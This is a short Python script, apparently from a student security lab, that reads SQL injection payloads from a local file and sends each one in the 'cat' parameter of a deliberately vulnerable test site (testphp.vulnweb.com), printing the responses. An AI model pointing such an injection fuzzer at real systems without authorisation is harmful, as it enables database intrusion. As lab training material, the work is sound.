import requests

domain = "http://testphp.vulnweb.com/listproducts.php?cat="
mysql_attacks = []
with open('C:\\Users\\leduy\\OneDrive\\Documents\\LêDuyHiển_AT180316_TH2\\MySQL.txt', 'r') as filehandle:
    for line in filehandle:
        attack = line[:-1]
        mysql_attacks.append(attack) 
for attack in mysql_attacks:
    print("Cheking..." + domain + attack)
    response = requests.get(domain + attack)
    print(response)
    